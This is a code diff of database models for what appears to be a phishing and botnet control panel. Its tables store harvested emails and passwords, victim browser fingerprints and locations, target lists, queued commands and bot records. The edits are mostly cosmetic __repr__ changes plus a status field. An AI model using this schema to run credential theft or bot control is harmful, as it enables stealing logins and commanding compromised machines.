@@ -13,7 +13,7 @@ class Users(Base):
         self.password = password
 
     def __repr__(self):
-        return f"[{self.email}, {self.password}]"
+        return f"[{self.email},{self.password}]"
 
 
 
@@ -33,7 +33,7 @@ class Fishing(Base):
         self.password = password
 
     def __repr__(self):
-        return f"[{self.ID},{self.email}, {self.ip}, {self.username}, {self.password}]"
+        return f"[{self.ID},{self.email},{self.ip},{self.username},{self.password}]"
 
 class Hooking(Base):
     __tablename__ = 'HOOKING'
@@ -66,7 +66,7 @@ class Hooking(Base):
         self.platform = platform
 
     def __repr__(self):
-        return f"[{self.ID},{self.email}, {self.ip}, {self.lon}, {self.lat}, {self.screen_h}, {self.screen_w}, {self.app_name}, {self.app_code_name}, {self.product_name}, {self.user_agent}, {self.platform}]"
+        return f"[{self.ID},{self.email},{self.ip},{self.lon},{self.lat},{self.screen_h},{self.screen_w},{self.app_name},{self.app_code_name},{self.product_name},{self.user_agent},{self.platform}]"
 
 
 class ApiToken(Base):
@@ -81,7 +81,7 @@ class ApiToken(Base):
         self.user_email = user_email
 
     def __repr__(self):
-        return f"[{self.ID} ,{self.token}, {self.user_email}]"
+        return f"[{self.ID},{self.token},{self.user_email}]"
 
 
 class Targets(Base):
@@ -96,7 +96,7 @@ class Targets(Base):
         self.token = token
 
     def __repr__(self):
-        return f"[{self.target_name}, {self.user_email},{self.token}]"
+        return f"[{self.target_name},{self.user_email},{self.token}]"
 
 # only hold one information per a person and it will get update everytime he/she change Instraction
 class Instraction(Base):
@@ -105,16 +105,18 @@ class Instraction(Base):
     delay = Column(Integer)
     target_name = Column(String,ForeignKey('TARGETS.target_name'),primary_key=True)
     instraction = Column(String)
+    stutas = Column(String)
 
-    def __init__(self ,ID , delay, target_name, instraction,token):
+    def __init__(self ,ID , delay, target_name, instraction,stutas):
         self.ID = ID
         self.delay = delay
         self.target_name = target_name
         self.instraction = instraction
+        self.stutas = stutas # active and Inactive
 
 
     def __repr__(self):
-        return f"[{self.ID}, {self.delay}, {self.target_name}, {self.instraction}]"
+        return f"[{self.ID},{self.delay},{self.target_name},{self.instraction},{self.stutas}]"
 
 
 class APICommand(Base):
@@ -133,7 +135,7 @@ class APICommand(Base):
         self.condition = condition
 
     def __repr__(self):
-        return f"[{self.ID},{self.email}, {self.target_name}, {self.cmd}, {self.condition}]"
+        return f"[{self.ID},{self.email},{self.target_name},{self.cmd},{self.condition}]"
 
 
 class APILink(Base):
@@ -154,7 +156,7 @@ class APILink(Base):
         self.condition = condition
 
     def __repr__(self):
-        return f"[{self.ID},{self.email}, {self.target_name}, {self.link}, {self.action_type}, {self.condition}]"
+        return f"[{self.ID},{self.email},{self.target_name},{self.link},{self.action_type},{self.condition}]"
 
 
 class BotNet(Base):
@@ -174,4 +176,4 @@ class BotNet(Base):
 
 
     def __repr__(self):
-        return f"[{self.ID}, {self.token}, {self.target_name}, {self.botNetType}, {self.status}]"
+        return f"[{self.ID},{self.token},{self.target_name},{self.botNetType},{self.status}]"
